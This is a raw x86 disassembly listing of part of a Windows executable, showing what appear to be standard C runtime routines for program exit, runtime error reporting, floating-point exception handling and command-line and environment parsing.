  422c0e:	mov    edi,DWORD PTR [ebp-0x70]
  422c11:	cmp    DWORD PTR [ebp-0x1c],0x0
  422c15:	jne    0x422c1d
  422c17:	push   edi
  422c18:	call   0x422dbc
  422c1d:	call   0x422ddc
  422c22:	or     DWORD PTR [ebp-0x4],0xffffffff
  422c26:	mov    eax,edi
  422c28:	lea    esp,[ebp-0x7c]
  422c2b:	call   0x42398b
  422c30:	ret    
  422c31:	push   0x42817c
  422c36:	call   DWORD PTR ds:0x428044
  422c3c:	test   eax,eax
  422c3e:	je     0x422c56
  422c40:	push   0x42816c
  422c45:	push   eax
  422c46:	call   DWORD PTR ds:0x428040
  422c4c:	test   eax,eax
  422c4e:	je     0x422c56
  422c50:	push   DWORD PTR [esp+0x4]
  422c54:	call   eax
  422c56:	push   DWORD PTR [esp+0x4]
  422c5a:	call   DWORD PTR ds:0x428068
  422c60:	int3   
  422c61:	push   0x8
  422c63:	call   0x423b0f
  422c68:	pop    ecx
  422c69:	ret    
  422c6a:	push   0x8
  422c6c:	call   0x423a7b
  422c71:	pop    ecx
  422c72:	ret    
  422c73:	mov    eax,ds:0x4664b0
  422c78:	test   eax,eax
  422c7a:	je     0x422c7e
  422c7c:	call   eax
  422c7e:	push   esi
  422c7f:	push   edi
  422c80:	mov    ecx,0x42a00c
  422c85:	mov    edi,0x42a018
  422c8a:	xor    eax,eax
  422c8c:	cmp    ecx,edi
  422c8e:	mov    esi,ecx
  422c90:	jae    0x422ca9
  422c92:	test   eax,eax
  422c94:	jne    0x422cd5
  422c96:	mov    ecx,DWORD PTR [esi]
  422c98:	test   ecx,ecx
  422c9a:	je     0x422c9e
  422c9c:	call   ecx
  422c9e:	add    esi,0x4
  422ca1:	cmp    esi,edi
  422ca3:	jb     0x422c92
  422ca5:	test   eax,eax
  422ca7:	jne    0x422cd5
  422ca9:	push   0x4237a1
  422cae:	call   0x423c20
  422cb3:	mov    esi,0x42a000
  422cb8:	mov    eax,esi
  422cba:	mov    edi,0x42a008
  422cbf:	cmp    eax,edi
  422cc1:	pop    ecx
  422cc2:	jae    0x422cd3
  422cc4:	mov    eax,DWORD PTR [esi]
  422cc6:	test   eax,eax
  422cc8:	je     0x422ccc
  422cca:	call   eax
  422ccc:	add    esi,0x4
  422ccf:	cmp    esi,edi
  422cd1:	jb     0x422cc4
  422cd3:	xor    eax,eax
  422cd5:	pop    edi
  422cd6:	pop    esi
  422cd7:	ret    
  422cd8:	push   ebp
  422cd9:	mov    ebp,esp
  422cdb:	push   esi
  422cdc:	push   edi
  422cdd:	push   0x8
  422cdf:	call   0x423b0f
  422ce4:	xor    esi,esi
  422ce6:	inc    esi
  422ce7:	cmp    DWORD PTR ds:0x465d44,esi
  422ced:	pop    ecx
  422cee:	jne    0x422d00
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	call   DWORD PTR ds:0x428070
  422cf9:	push   eax
  422cfa:	call   DWORD PTR ds:0x42806c
  422d00:	cmp    DWORD PTR [ebp+0xc],0x0
  422d04:	mov    al,BYTE PTR [ebp+0x10]
  422d07:	mov    DWORD PTR ds:0x465d40,esi
  422d0d:	mov    ds:0x465d3c,al
  422d12:	jne    0x422d66
  422d14:	mov    ecx,DWORD PTR ds:0x4664a8
  422d1a:	test   ecx,ecx
  422d1c:	je     0x422d47
  422d1e:	mov    eax,ds:0x4664a4
  422d23:	sub    eax,0x4
  422d26:	cmp    eax,ecx
  422d28:	jmp    0x422d40
  422d2a:	mov    eax,DWORD PTR [eax]
  422d2c:	test   eax,eax
  422d2e:	je     0x422d32
  422d30:	call   eax
  422d32:	mov    eax,ds:0x4664a4
  422d37:	sub    eax,0x4
  422d3a:	cmp    eax,DWORD PTR ds:0x4664a8
  422d40:	mov    ds:0x4664a4,eax
  422d45:	jae    0x422d2a
  422d47:	mov    eax,0x42a01c
  422d4c:	mov    esi,0x42a020
  422d51:	cmp    eax,esi
  422d53:	mov    edi,eax
  422d55:	jae    0x422d66
  422d57:	mov    eax,DWORD PTR [edi]
  422d59:	test   eax,eax
  422d5b:	je     0x422d5f
  422d5d:	call   eax
  422d5f:	add    edi,0x4
  422d62:	cmp    edi,esi
  422d64:	jb     0x422d57
  422d66:	mov    eax,0x42a024
  422d6b:	mov    esi,0x42a028
  422d70:	cmp    eax,esi
  422d72:	mov    edi,eax
  422d74:	jae    0x422d85
  422d76:	mov    eax,DWORD PTR [edi]
  422d78:	test   eax,eax
  422d7a:	je     0x422d7e
  422d7c:	call   eax
  422d7e:	add    edi,0x4
  422d81:	cmp    edi,esi
  422d83:	jb     0x422d76
  422d85:	cmp    DWORD PTR [ebp+0x10],0x0
  422d89:	pop    edi
  422d8a:	pop    esi
  422d8b:	je     0x422d96
  422d8d:	push   0x8
  422d8f:	call   0x423a7b
  422d94:	jmp    0x422da8
  422d96:	push   DWORD PTR [ebp+0x8]
  422d99:	mov    DWORD PTR ds:0x465d44,0x1
  422da3:	call   0x422c31
  422da8:	pop    ecx
  422da9:	pop    ebp
  422daa:	ret    
  422dab:	push   0x0
  422dad:	push   0x0
  422daf:	push   DWORD PTR [esp+0xc]
  422db3:	call   0x422cd8
  422db8:	add    esp,0xc
  422dbb:	ret    
  422dbc:	push   0x0
  422dbe:	push   0x1
  422dc0:	push   DWORD PTR [esp+0xc]
  422dc4:	call   0x422cd8
  422dc9:	add    esp,0xc
  422dcc:	ret    
  422dcd:	push   0x1
  422dcf:	push   0x0
  422dd1:	push   0x0
  422dd3:	call   0x422cd8
  422dd8:	add    esp,0xc
  422ddb:	ret    
  422ddc:	push   0x1
  422dde:	push   0x1
  422de0:	push   0x0
  422de2:	call   0x422cd8
  422de7:	add    esp,0xc
  422dea:	ret    
  422deb:	push   ebp
  422dec:	mov    ebp,esp
  422dee:	sub    esp,0x10c
  422df4:	mov    eax,ds:0x465660
  422df9:	xor    eax,DWORD PTR [ebp+0x4]
  422dfc:	mov    ecx,DWORD PTR [ebp+0x8]
  422dff:	push   ebx
  422e00:	push   esi
  422e01:	mov    DWORD PTR [ebp-0x4],eax
  422e04:	xor    edx,edx
  422e06:	push   edi
  422e07:	xor    eax,eax
  422e09:	cmp    ecx,DWORD PTR [eax*8+0x4653f0]
  422e10:	je     0x422e18
  422e12:	inc    eax
  422e13:	cmp    eax,0x12
  422e16:	jb     0x422e09
  422e18:	mov    esi,eax
  422e1a:	shl    esi,0x3
  422e1d:	cmp    ecx,DWORD PTR [esi+0x4653f0]
  422e23:	jne    0x422f4c
  422e29:	mov    eax,ds:0x465cfc
  422e2e:	cmp    eax,0x1
  422e31:	je     0x422f27
  422e37:	cmp    eax,edx
  422e39:	jne    0x422e48
  422e3b:	cmp    DWORD PTR ds:0x4653ec,0x1
  422e42:	je     0x422f27
  422e48:	cmp    ecx,0xfc
  422e4e:	je     0x422f4c
  422e54:	push   0x104
  422e59:	lea    eax,[ebp-0x10c]
  422e5f:	push   eax
  422e60:	push   edx
  422e61:	mov    BYTE PTR [ebp-0x8],dl
  422e64:	call   DWORD PTR ds:0x42807c
  422e6a:	test   eax,eax
  422e6c:	jne    0x422e81
  422e6e:	lea    eax,[ebp-0x10c]
  422e74:	push   0x4284d4
  422e79:	push   eax
  422e7a:	call   0x423d30
  422e7f:	pop    ecx
  422e80:	pop    ecx
  422e81:	lea    eax,[ebp-0x10c]
  422e87:	push   eax
  422e88:	lea    edi,[ebp-0x10c]
  422e8e:	call   0x423f60
  422e93:	inc    eax
  422e94:	cmp    eax,0x3c
  422e97:	pop    ecx
  422e98:	jbe    0x422ec3
  422e9a:	lea    eax,[ebp-0x10c]
  422ea0:	push   eax
  422ea1:	call   0x423f60
  422ea6:	mov    edi,eax
  422ea8:	lea    eax,[ebp-0x10c]
  422eae:	sub    eax,0x3b
  422eb1:	push   0x3
  422eb3:	add    edi,eax
  422eb5:	push   0x4284d0
  422eba:	push   edi
  422ebb:	call   0x423e30
  422ec0:	add    esp,0x10
  422ec3:	push   edi
  422ec4:	call   0x423f60
  422ec9:	push   DWORD PTR [esi+0x4653f4]
  422ecf:	mov    ebx,eax
  422ed1:	call   0x423f60
  422ed6:	lea    eax,[ebx+eax*1+0x1c]
  422eda:	pop    ecx
  422edb:	add    eax,0x3
  422ede:	pop    ecx
  422edf:	and    eax,0xfffffffc
  422ee2:	call   0x4239a0
  422ee7:	mov    ebx,esp
  422ee9:	push   0x4284b4
  422eee:	push   ebx
  422eef:	call   0x423d30
  422ef4:	push   edi
  422ef5:	push   ebx
  422ef6:	call   0x423d40
  422efb:	push   0x4284b0
  422f00:	push   ebx
  422f01:	call   0x423d40
  422f06:	push   DWORD PTR [esi+0x4653f4]
  422f0c:	push   ebx
  422f0d:	call   0x423d40
  422f12:	push   0x12010
  422f17:	push   0x428488
  422f1c:	push   ebx
  422f1d:	call   0x423c32
  422f22:	add    esp,0x2c
  422f25:	jmp    0x422f4c
  422f27:	push   edx
  422f28:	lea    eax,[ebp+0x8]
  422f2b:	push   eax
  422f2c:	lea    esi,[esi+0x4653f4]
  422f32:	push   DWORD PTR [esi]
  422f34:	call   0x423f60
  422f39:	pop    ecx
  422f3a:	push   eax
  422f3b:	push   DWORD PTR [esi]
  422f3d:	push   0xfffffff4
  422f3f:	call   DWORD PTR ds:0x428078
  422f45:	push   eax
  422f46:	call   DWORD PTR ds:0x428074
  422f4c:	lea    esp,[ebp-0x118]
  422f52:	mov    ecx,DWORD PTR [ebp-0x4]
  422f55:	xor    ecx,DWORD PTR [ebp+0x4]
  422f58:	call   0x42401c
  422f5d:	pop    edi
  422f5e:	pop    esi
  422f5f:	pop    ebx
  422f60:	leave  
  422f61:	ret    
  422f62:	mov    eax,ds:0x465cfc
  422f67:	cmp    eax,0x1
  422f6a:	je     0x422f79
  422f6c:	test   eax,eax
  422f6e:	jne    0x422f9a
  422f70:	cmp    DWORD PTR ds:0x4653ec,0x1
  422f77:	jne    0x422f9a
  422f79:	push   0xfc
  422f7e:	call   0x422deb
  422f83:	mov    eax,ds:0x465d48
  422f88:	test   eax,eax
  422f8a:	pop    ecx
  422f8b:	je     0x422f8f
  422f8d:	call   eax
  422f8f:	push   0xff
  422f94:	call   0x422deb
  422f99:	pop    ecx
  422f9a:	ret    
  422f9b:	push   ebp
  422f9c:	mov    ebp,esp
  422f9e:	push   ecx
  422f9f:	push   ebx
  422fa0:	push   esi
  422fa1:	push   edi
  422fa2:	call   0x423803
  422fa7:	mov    edi,DWORD PTR [ebp+0x8]
  422faa:	mov    esi,eax
  422fac:	mov    edx,DWORD PTR [esi+0x54]
  422faf:	mov    eax,ds:0x465504
  422fb4:	mov    ecx,edx
  422fb6:	cmp    DWORD PTR [ecx],edi
  422fb8:	je     0x422fc7
  422fba:	lea    ebx,[eax+eax*2]
  422fbd:	add    ecx,0xc
  422fc0:	lea    ebx,[edx+ebx*4]
  422fc3:	cmp    ecx,ebx
  422fc5:	jb     0x422fb6
  422fc7:	lea    eax,[eax+eax*2]
  422fca:	lea    eax,[edx+eax*4]
  422fcd:	cmp    ecx,eax
  422fcf:	jae    0x422fd5
  422fd1:	cmp    DWORD PTR [ecx],edi
  422fd3:	je     0x422fd7
  422fd5:	xor    ecx,ecx
  422fd7:	test   ecx,ecx
  422fd9:	je     0x4230f1
  422fdf:	mov    ebx,DWORD PTR [ecx+0x8]
  422fe2:	test   ebx,ebx
  422fe4:	mov    DWORD PTR [ebp+0x8],ebx
  422fe7:	je     0x4230f1
  422fed:	cmp    ebx,0x5
  422ff0:	jne    0x422ffe
  422ff2:	and    DWORD PTR [ecx+0x8],0x0
  422ff6:	xor    eax,eax
  422ff8:	inc    eax
  422ff9:	jmp    0x4230fa
  422ffe:	cmp    ebx,0x1
  423001:	je     0x4230ec
  423007:	mov    eax,DWORD PTR [esi+0x58]
  42300a:	mov    DWORD PTR [ebp-0x4],eax
  42300d:	mov    eax,DWORD PTR [ebp+0xc]
  423010:	mov    DWORD PTR [esi+0x58],eax
  423013:	mov    eax,DWORD PTR [ecx+0x4]
  423016:	cmp    eax,0x8
  423019:	jne    0x4230de
  42301f:	mov    edx,DWORD PTR ds:0x4654f8
  423025:	mov    eax,ds:0x4654fc
  42302a:	add    eax,edx
  42302c:	cmp    edx,eax
  42302e:	jge    0x423057
  423030:	lea    eax,[edx+edx*2]
  423033:	shl    eax,0x2
  423036:	mov    edi,DWORD PTR [esi+0x54]
  423039:	and    DWORD PTR [eax+edi*1+0x8],0x0
  42303e:	mov    edi,DWORD PTR ds:0x4654f8
  423044:	mov    ebx,DWORD PTR ds:0x4654fc
  42304a:	inc    edx
  42304b:	add    ebx,edi
  42304d:	add    eax,0xc
  423050:	cmp    edx,ebx
  423052:	jl     0x423036
  423054:	mov    ebx,DWORD PTR [ebp+0x8]
  423057:	mov    ecx,DWORD PTR [ecx]
  423059:	cmp    ecx,0xc000008e
  42305f:	mov    edi,DWORD PTR [esi+0x5c]
  423062:	jne    0x42306d
  423064:	mov    DWORD PTR [esi+0x5c],0x83
  42306b:	jmp    0x4230d1
  42306d:	cmp    ecx,0xc0000090
  423073:	jne    0x42307e
  423075:	mov    DWORD PTR [esi+0x5c],0x81
  42307c:	jmp    0x4230d1
  42307e:	cmp    ecx,0xc0000091
  423084:	jne    0x42308f
  423086:	mov    DWORD PTR [esi+0x5c],0x84
  42308d:	jmp    0x4230d1
  42308f:	cmp    ecx,0xc0000093
  423095:	jne    0x4230a0
  423097:	mov    DWORD PTR [esi+0x5c],0x85
  42309e:	jmp    0x4230d1
  4230a0:	cmp    ecx,0xc000008d
  4230a6:	jne    0x4230b1
  4230a8:	mov    DWORD PTR [esi+0x5c],0x82
  4230af:	jmp    0x4230d1
  4230b1:	cmp    ecx,0xc000008f
  4230b7:	jne    0x4230c2
  4230b9:	mov    DWORD PTR [esi+0x5c],0x86
  4230c0:	jmp    0x4230d1
  4230c2:	cmp    ecx,0xc0000092
  4230c8:	jne    0x4230d1
  4230ca:	mov    DWORD PTR [esi+0x5c],0x8a
  4230d1:	push   DWORD PTR [esi+0x5c]
  4230d4:	push   0x8
  4230d6:	call   ebx
  4230d8:	pop    ecx
  4230d9:	mov    DWORD PTR [esi+0x5c],edi
  4230dc:	jmp    0x4230e5
  4230de:	and    DWORD PTR [ecx+0x8],0x0
  4230e2:	push   eax
  4230e3:	call   ebx
  4230e5:	mov    eax,DWORD PTR [ebp-0x4]
  4230e8:	pop    ecx
  4230e9:	mov    DWORD PTR [esi+0x58],eax
  4230ec:	or     eax,0xffffffff
  4230ef:	jmp    0x4230fa
  4230f1:	push   DWORD PTR [ebp+0xc]
  4230f4:	call   DWORD PTR ds:0x428080
  4230fa:	pop    edi
  4230fb:	pop    esi
  4230fc:	pop    ebx
  4230fd:	leave  
  4230fe:	ret    
  4230ff:	cmp    DWORD PTR ds:0x4664ac,0x0
  423106:	jne    0x42310d
  423108:	call   0x42453c
  42310d:	push   esi
  42310e:	mov    esi,DWORD PTR ds:0x4664b4
  423114:	test   esi,esi
  423116:	jne    0x42311f
  423118:	mov    esi,0x4284eb
  42311d:	jmp    0x423164
  42311f:	mov    al,BYTE PTR [esi]
  423121:	cmp    al,0x22
  423123:	jne    0x42314d
  423125:	inc    esi
  423126:	mov    al,BYTE PTR [esi]
  423128:	cmp    al,0x22
  42312a:	je     0x42315d
  42312c:	test   al,al
  42312e:	je     0x423146
  423130:	movzx  eax,al
  423133:	push   eax
  423134:	call   0x42405b
  423139:	test   eax,eax
  42313b:	pop    ecx
  42313c:	je     0x42313f
  42313e:	inc    esi
  42313f:	inc    esi
  423140:	mov    al,BYTE PTR [esi]
  423142:	cmp    al,0x22
  423144:	jne    0x42312c
  423146:	cmp    BYTE PTR [esi],0x22
  423149:	jne    0x42315e
  42314b:	jmp    0x42315d
  42314d:	cmp    al,0x20
  42314f:	jbe    0x42315e
  423151:	inc    esi
  423152:	cmp    BYTE PTR [esi],0x20
  423155:	ja     0x423151
  423157:	jmp    0x42315e
  423159:	cmp    al,0x20
  42315b:	ja     0x423164
  42315d:	inc    esi
  42315e:	mov    al,BYTE PTR [esi]
  423160:	test   al,al
  423162:	jne    0x423159
  423164:	mov    eax,esi
  423166:	pop    esi
  423167:	ret    
  423168:	push   ebx
  423169:	xor    ebx,ebx
  42316b:	cmp    DWORD PTR ds:0x4664ac,ebx
  423171:	push   esi
  423172:	push   edi
  423173:	jne    0x42317a
  423175:	call   0x42453c
  42317a:	mov    esi,DWORD PTR ds:0x465cf4
  423180:	xor    edi,edi
  423182:	cmp    esi,ebx
  423184:	jne    0x423198
  423186:	jmp    0x4231b8
  423188:	cmp    al,0x3d
  42318a:	je     0x42318d
  42318c:	inc    edi
  42318d:	push   esi
  42318e:	call   0x423f60
  423193:	pop    ecx
  423194:	lea    esi,[esi+eax*1+0x1]
  423198:	mov    al,BYTE PTR [esi]
  42319a:	cmp    al,bl
  42319c:	jne    0x423188
  42319e:	lea    eax,[edi*4+0x4]
  4231a5:	push   eax
  4231a6:	call   0x424672
  4231ab:	mov    edi,eax
  4231ad:	cmp    edi,ebx
  4231af:	pop    ecx
  4231b0:	mov    DWORD PTR ds:0x465d24,edi
  4231b6:	jne    0x4231bd
  4231b8:	or     eax,0xffffffff
  4231bb:	jmp    0x423215
  4231bd:	mov    esi,DWORD PTR ds:0x465cf4
  4231c3:	push   ebp
  4231c4:	jmp    0x4231f0
  4231c6:	push   esi
  4231c7:	call   0x423f60
  4231cc:	mov    ebp,eax
  4231ce:	inc    ebp
  4231cf:	cmp    BYTE PTR [esi],0x3d
  4231d2:	pop    ecx
  4231d3:	je     0x4231ee
  4231d5:	push   ebp
  4231d6:	call   0x424672
  4231db:	cmp    eax,ebx
  4231dd:	pop    ecx
  4231de:	mov    DWORD PTR [edi],eax
  4231e0:	je     0x423219
  4231e2:	push   esi
  4231e3:	push   eax
  4231e4:	call   0x423d30
  4231e9:	pop    ecx
  4231ea:	pop    ecx
  4231eb:	add    edi,0x4
  4231ee:	add    esi,ebp
  4231f0:	cmp    BYTE PTR [esi],bl
  4231f2:	jne    0x4231c6
  4231f4:	push   DWORD PTR ds:0x465cf4
  4231fa:	call   0x42455a
  4231ff:	mov    DWORD PTR ds:0x465cf4,ebx
  423205:	mov    DWORD PTR [edi],ebx
  423207:	mov    DWORD PTR ds:0x4664a0,0x1
  423211:	xor    eax,eax
  423213:	pop    ecx
  423214:	pop    ebp
  423215:	pop    edi
  423216:	pop    esi
  423217:	pop    ebx
  423218:	ret    
  423219:	push   DWORD PTR ds:0x465d24
  42321f:	call   0x42455a
  423224:	mov    DWORD PTR ds:0x465d24,ebx
  42322a:	or     eax,0xffffffff
  42322d:	jmp    0x423213
  42322f:	push   ebp
  423230:	mov    ebp,esp
  423232:	push   ecx
  423233:	push   ebx
  423234:	mov    ebx,DWORD PTR [ebp+0xc]
  423237:	xor    edx,edx
  423239:	cmp    DWORD PTR [ebp+0x8],edx
  42323c:	push   edi
  42323d:	mov    DWORD PTR [esi],edx
  42323f:	mov    edi,ecx
  423241:	mov    DWORD PTR [ebx],0x1
  423247:	je     0x423252
  423249:	mov    ecx,DWORD PTR [ebp+0x8]
  42324c:	add    DWORD PTR [ebp+0x8],0x4
  423250:	mov    DWORD PTR [ecx],edi
  423252:	cmp    BYTE PTR [eax],0x22
  423255:	jne    0x423265
  423257:	xor    ecx,ecx
  423259:	test   edx,edx
  42325b:	sete   cl
  42325e:	inc    eax
  42325f:	mov    edx,ecx
  423261:	mov    cl,0x22
  423263:	jmp    0x423292
  423265:	inc    DWORD PTR [esi]
  423267:	test   edi,edi
  423269:	je     0x423270
  42326b:	mov    cl,BYTE PTR [eax]
  42326d:	mov    BYTE PTR [edi],cl
  42326f:	inc    edi
  423270:	mov    cl,BYTE PTR [eax]
  423272:	movzx  ebx,cl
  423275:	inc    eax
  423276:	test   BYTE PTR [ebx+0x466161],0x4
  42327d:	je     0x42328b
  42327f:	inc    DWORD PTR [esi]
  423281:	test   edi,edi
  423283:	je     0x42328a
  423285:	mov    bl,BYTE PTR [eax]
  423287:	mov    BYTE PTR [edi],bl
  423289:	inc    edi
  42328a:	inc    eax
  42328b:	test   cl,cl
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	je     0x4232c4
  423292:	test   edx,edx
  423294:	jne    0x423252
  423296:	cmp    cl,0x20
  423299:	je     0x4232a0
  42329b:	cmp    cl,0x9
  42329e:	jne    0x423252
  4232a0:	test   edi,edi
  4232a2:	je     0x4232a8
  4232a4:	and    BYTE PTR [edi-0x1],0x0
  4232a8:	and    DWORD PTR [ebp-0x4],0x0
  4232ac:	cmp    BYTE PTR [eax],0x0
  4232af:	je     0x42338b
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	cmp    cl,0x20
  4232ba:	je     0x4232c1
  4232bc:	cmp    cl,0x9
  4232bf:	jne    0x4232c7
  4232c1:	inc    eax
  4232c2:	jmp    0x4232b5
  4232c4:	dec    eax
  4232c5:	jmp    0x4232a8
  4232c7:	cmp    BYTE PTR [eax],0x0
  4232ca:	je     0x42338b
  4232d0:	cmp    DWORD PTR [ebp+0x8],0x0
  4232d4:	je     0x4232df
  4232d6:	mov    ecx,DWORD PTR [ebp+0x8]
  4232d9:	add    DWORD PTR [ebp+0x8],0x4
  4232dd:	mov    DWORD PTR [ecx],edi
  4232df:	inc    DWORD PTR [ebx]
  4232e1:	xor    ebx,ebx
  4232e3:	inc    ebx
  4232e4:	xor    edx,edx
  4232e6:	jmp    0x4232ea
  4232e8:	inc    eax
  4232e9:	inc    edx
  4232ea:	cmp    BYTE PTR [eax],0x5c
  4232ed:	je     0x4232e8
  4232ef:	cmp    BYTE PTR [eax],0x22
  4232f2:	jne    0x42331a
  4232f4:	test   dl,0x1
  4232f7:	jne    0x423318
  4232f9:	cmp    DWORD PTR [ebp-0x4],0x0
  4232fd:	je     0x42330b
  4232ff:	lea    ecx,[eax+0x1]
  423302:	cmp    BYTE PTR [ecx],0x22
  423305:	jne    0x42330b
  423307:	mov    eax,ecx
  423309:	jmp    0x42330d
  42330b:	xor    ebx,ebx
  42330d:	xor    ecx,ecx
  42330f:	cmp    DWORD PTR [ebp-0x4],ecx
  423312:	sete   cl
  423315:	mov    DWORD PTR [ebp-0x4],ecx
  423318:	shr    edx,1
  42331a:	test   edx,edx
  42331c:	je     0x42332b
  42331e:	test   edi,edi
  423320:	je     0x423326
  423322:	mov    BYTE PTR [edi],0x5c
  423325:	inc    edi
  423326:	inc    DWORD PTR [esi]
  423328:	dec    edx
  423329:	jne    0x42331e
  42332b:	mov    cl,BYTE PTR [eax]
  42332d:	test   cl,cl
  42332f:	je     0x423379
  423331:	cmp    DWORD PTR [ebp-0x4],0x0
  423335:	jne    0x423341
  423337:	cmp    cl,0x20
  42333a:	je     0x423379
  42333c:	cmp    cl,0x9
  42333f:	je     0x423379
  423341:	test   ebx,ebx
  423343:	je     0x423373
  423345:	test   edi,edi
  423347:	je     0x423362
  423349:	movzx  edx,cl
  42334c:	test   BYTE PTR [edx+0x466161],0x4
  423353:	je     0x42335b
  423355:	mov    BYTE PTR [edi],cl
  423357:	inc    edi
  423358:	inc    eax
  423359:	inc    DWORD PTR [esi]
  42335b:	mov    cl,BYTE PTR [eax]
  42335d:	mov    BYTE PTR [edi],cl
  42335f:	inc    edi
  423360:	jmp    0x423371
  423362:	movzx  ecx,cl
  423365:	test   BYTE PTR [ecx+0x466161],0x4
  42336c:	je     0x423371
  42336e:	inc    eax
  42336f:	inc    DWORD PTR [esi]
  423371:	inc    DWORD PTR [esi]
  423373:	inc    eax
  423374:	jmp    0x4232e1
  423379:	test   edi,edi
  42337b:	je     0x423381
  42337d:	and    BYTE PTR [edi],0x0
  423380:	inc    edi
  423381:	inc    DWORD PTR [esi]
  423383:	mov    ebx,DWORD PTR [ebp+0xc]
  423386:	jmp    0x4232ac
  42338b:	mov    eax,DWORD PTR [ebp+0x8]
  42338e:	test   eax,eax
  423390:	je     0x423395
  423392:	and    DWORD PTR [eax],0x0
  423395:	inc    DWORD PTR [ebx]
  423397:	pop    edi
  423398:	pop    ebx
  423399:	leave  
  42339a:	ret    
  42339b:	push   ebp
  42339c:	mov    ebp,esp
  42339e:	push   ecx
  42339f:	push   ecx
  4233a0:	push   ebx
  4233a1:	push   esi
  4233a2:	push   edi
  4233a3:	xor    edi,edi
  4233a5:	cmp    DWORD PTR ds:0x4664ac,edi
  4233ab:	jne    0x4233b2
  4233ad:	call   0x42453c
  4233b2:	and    BYTE PTR ds:0x465e54,0x0
  4233b9:	push   0x104
  4233be:	mov    esi,0x465d50
  4233c3:	push   esi
  4233c4:	push   edi
  4233c5:	call   DWORD PTR ds:0x42807c
  4233cb:	mov    eax,ds:0x4664b4
  4233d0:	cmp    eax,edi
  4233d2:	mov    DWORD PTR ds:0x465d34,esi
  4233d8:	je     0x4233e1
  4233da:	cmp    BYTE PTR [eax],0x0
  4233dd:	mov    ebx,eax
  4233df:	jne    0x4233e3
  4233e1:	mov    ebx,esi
  4233e3:	lea    eax,[ebp-0x4]
  4233e6:	push   eax
  4233e7:	push   edi
  4233e8:	lea    esi,[ebp-0x8]
  4233eb:	xor    ecx,ecx
  4233ed:	mov    eax,ebx
  4233ef:	call   0x42322f
  4233f4:	mov    esi,DWORD PTR [ebp-0x4]
  4233f7:	mov    eax,DWORD PTR [ebp-0x8]
  4233fa:	shl    esi,0x2
  4233fd:	add    eax,esi
  4233ff:	push   eax
  423400:	call   0x424672
  423405:	mov    edi,eax
  423407:	add    esp,0xc
  42340a:	test   edi,edi
  42340c:	jne    0x423413
  42340e:	or     eax,0xffffffff
  423411:	jmp    0x423438
  423413:	lea    eax,[ebp-0x4]
  423416:	push   eax
  423417:	lea    ecx,[esi+edi*1]
  42341a:	push   edi
  42341b:	lea    esi,[ebp-0x8]
  42341e:	mov    eax,ebx
  423420:	call   0x42322f
  423425:	mov    eax,DWORD PTR [ebp-0x4]
  423428:	dec    eax
  423429:	pop    ecx
  42342a:	mov    ds:0x465d18,eax
  42342f:	pop    ecx
  423430:	mov    DWORD PTR ds:0x465d1c,edi
  423436:	xor    eax,eax
  423438:	pop    edi
  423439:	pop    esi
  42343a:	pop    ebx
  42343b:	leave  
  42343c:	ret    
  42343d:	push   ecx
  42343e:	push   ecx
  42343f:	mov    eax,ds:0x465e58
  423444:	push   ebx
  423445:	push   ebp
  423446:	push   esi
  423447:	push   edi
  423448:	mov    edi,DWORD PTR ds:0x428094
  42344e:	xor    ebx,ebx
  423450:	xor    esi,esi
  423452:	cmp    eax,ebx
  423454:	push   0x2
  423456:	pop    ebp
  423457:	jne    0x423486
  423459:	call   edi
  42345b:	mov    esi,eax
  42345d:	cmp    esi,ebx
  42345f:	je     0x42346d
  423461:	mov    DWORD PTR ds:0x465e58,0x1
  42346b:	jmp    0x42348b
  42346d:	call   DWORD PTR ds:0x42803c
  423473:	cmp    eax,0x78
  423476:	jne    0x423481
  423478:	mov    eax,ebp
  42347a:	mov    ds:0x465e58,eax
  42347f:	jmp    0x423486
  423481:	mov    eax,ds:0x465e58
  423486:	cmp    eax,0x1
  423489:	jne    0x423508
  42348b:	cmp    esi,ebx
  42348d:	jne    0x423497
  42348f:	call   edi
  423491:	mov    esi,eax
  423493:	cmp    esi,ebx
  423495:	je     0x423510
  423497:	cmp    WORD PTR [esi],bx
  42349a:	mov    eax,esi
  42349c:	je     0x4234ac
  42349e:	add    eax,ebp
  4234a0:	cmp    WORD PTR [eax],bx
  4234a3:	jne    0x42349e
  4234a5:	add    eax,ebp
  4234a7:	cmp    WORD PTR [eax],bx
  4234aa:	jne    0x42349e
  4234ac:	mov    edi,DWORD PTR ds:0x428090
  4234b2:	push   ebx
  4234b3:	push   ebx
  4234b4:	push   ebx
  4234b5:	sub    eax,esi
  4234b7:	push   ebx
  4234b8:	sar    eax,1
  4234ba:	inc    eax
  4234bb:	push   eax
  4234bc:	push   esi
  4234bd:	push   ebx
  4234be:	push   ebx
  4234bf:	mov    DWORD PTR [esp+0x34],eax
  4234c3:	call   edi
  4234c5:	mov    ebp,eax
  4234c7:	cmp    ebp,ebx
  4234c9:	je     0x4234fd
  4234cb:	push   ebp
  4234cc:	call   0x424672
  4234d1:	cmp    eax,ebx
  4234d3:	pop    ecx
  4234d4:	mov    DWORD PTR [esp+0x10],eax
  4234d8:	je     0x4234fd
  4234da:	push   ebx
  4234db:	push   ebx
  4234dc:	push   ebp
  4234dd:	push   eax
  4234de:	push   DWORD PTR [esp+0x24]
  4234e2:	push   esi
  4234e3:	push   ebx
  4234e4:	push   ebx
  4234e5:	call   edi
  4234e7:	test   eax,eax
  4234e9:	jne    0x4234f9
  4234eb:	push   DWORD PTR [esp+0x10]
  4234ef:	call   0x42455a
  4234f4:	pop    ecx
  4234f5:	mov    DWORD PTR [esp+0x10],ebx
  4234f9:	mov    ebx,DWORD PTR [esp+0x10]
  4234fd:	push   esi
  4234fe:	call   DWORD PTR ds:0x42808c
  423504:	mov    eax,ebx
  423506:	jmp    0x423558
  423508:	cmp    eax,ebp
  42350a:	je     0x423514
  42350c:	cmp    eax,ebx
  42350e:	je     0x423514
  423510:	xor    eax,eax
  423512:	jmp    0x423558
  423514:	call   DWORD PTR ds:0x428088
  42351a:	mov    esi,eax
  42351c:	cmp    esi,ebx
  42351e:	je     0x423510
  423520:	cmp    BYTE PTR [esi],bl
  423522:	je     0x42352e
  423524:	inc    eax
  423525:	cmp    BYTE PTR [eax],bl
  423527:	jne    0x423524
  423529:	inc    eax
  42352a:	cmp    BYTE PTR [eax],bl
  42352c:	jne    0x423524
  42352e:	sub    eax,esi
  423530:	inc    eax
  423531:	mov    ebp,eax
  423533:	push   ebp
  423534:	call   0x424672
  423539:	mov    edi,eax
  42353b:	cmp    edi,ebx
  42353d:	pop    ecx
  42353e:	jne    0x423544
  423540:	xor    edi,edi
